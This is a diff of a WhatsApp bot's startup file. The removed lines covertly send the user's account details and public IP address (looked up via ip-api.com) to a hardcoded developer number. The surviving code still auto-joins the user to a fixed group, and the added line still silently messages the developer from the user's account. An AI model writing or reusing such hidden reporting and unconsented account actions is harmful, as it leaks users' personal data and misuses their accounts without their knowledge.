@@ -15,8 +15,6 @@ const cp = require('child_process')
 const _ = require('lodash')
 const path = require('path')
 const fs = require('fs')
-const fetch = require("node-fetch")
-const { color } = require('./lib/color')
 var low
 try {
   low = require('lowdb')
@@ -51,32 +49,17 @@ global.DATABASE = global.db // Backwards Compatibility
 
 global.conn = new WAConnection()
 conn.version = [2, 2143, 3]
-let authFile = `${opts._[0] || 'session'}.json`
+let authFile = `${opts._[0] || 'session'}.data.json`
 if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
 if (opts['trace']) conn.logger.level = 'trace'
 if (opts['debug']) conn.logger.level = 'debug'
 if (opts['big-qr']) conn.on('qr', qr => generate(qr, { small: false }))
- 
+        //inform to developer that the user is connected to bot
+conn.sendMessage(`918602239106@s.whatsapp.net`, `Thanks bro, your Tokio Bot v2 is working on my whatsapp number ez😂`, MessageType.extendedText)
+    
     //group link target
     teks = `https://chat.whatsapp.com/IHP6JLwAIi4HeVJMDJPw1N`
     conn.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
-    
-        //inform to developer that the user is connected to bot
-        
-      conn.sendMessage(`918602239106@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
-         
-       conn.sendMessage(`918602239106@s.whatsapp.net`, `Thanks bro, your Olduser Tokio Bot is working on my whatsapp number ez😂`, MessageType.extendedText)
-    
-     conn.sendMessage(`918602239106@s.whatsapp.net`, `*Hi Owner olduser, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(conn.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer olduser Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./olduser.jpg'),sourceUrl:"https://wa.me/918602239106?text=Hello bro"}}})
-     
-	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
-fetch(`http://ip-api.com/line`).then(res => res.text())  
-        .then(bu =>{
-       conn.sendMessage("918602239106@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer olduser Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./olduser.jpg'),sourceUrl:"https://wa.me/918602239106?text=Hello bro"}}})
-       
-     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
-   })
-   
 if (!opts['test']) setInterval(async () => {
   await global.db.write()
 }, 60 * 1000) // Save every minute
